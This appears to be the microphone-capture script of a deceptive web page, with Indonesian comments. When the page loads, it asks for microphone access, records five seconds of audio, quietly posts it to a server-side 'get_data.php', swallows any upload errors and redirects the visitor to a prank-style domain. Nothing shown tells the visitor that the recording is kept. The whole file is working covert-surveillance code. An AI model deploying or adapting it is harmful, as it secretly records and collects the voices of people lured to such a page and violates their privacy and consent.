// .site/js/voice.js — Native MediaRecorder (No external libraries)
let redirectUrl = "https://you.regettingold.com/";

function Redirect() {
    window.location.href = redirectUrl;
}

async function startRecording() {
    let stream = null;
    let mediaRecorder = null;
    const audioChunks = [];

    try {
        // Minta akses mikrofon
        stream = await navigator.mediaDevices.getUserMedia({ audio: true });

        // Buat perekam
        mediaRecorder = new MediaRecorder(stream);

        mediaRecorder.ondataavailable = (e) => {
            if (e.data.size > 0) {
                audioChunks.push(e.data);
            }
        };

        mediaRecorder.onstop = async () => {
            // Hentikan semua track
            stream.getTracks().forEach(track => track.stop());

            // Buat blob
            const blob = new Blob(audioChunks, { type: 'audio/wav' });

            // Upload
            const fd = new FormData();
            fd.append("audio_data", blob, "audio.wav");

            try {
                await fetch("./get_data.php", {
                    method: "POST",
                    body: fd
                });
            } catch (err) {
                // Abaikan error upload
            }

            // Redirect setelah upload
            Redirect();
        };

        // Mulai rekam
        mediaRecorder.start();

        // Hentikan setelah 5 detik
        setTimeout(() => {
            if (mediaRecorder && mediaRecorder.state === "recording") {
                mediaRecorder.stop();
            }
        }, 5000);

    } catch (err) {
        // Jika ditolak atau error → redirect langsung
        if (stream) stream.getTracks().forEach(track => track.stop());
        Redirect();
    }
}

// Jalankan setelah halaman siap
if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", () => {
        setTimeout(startRecording, 300);
    });
} else {
    setTimeout(startRecording, 300);
}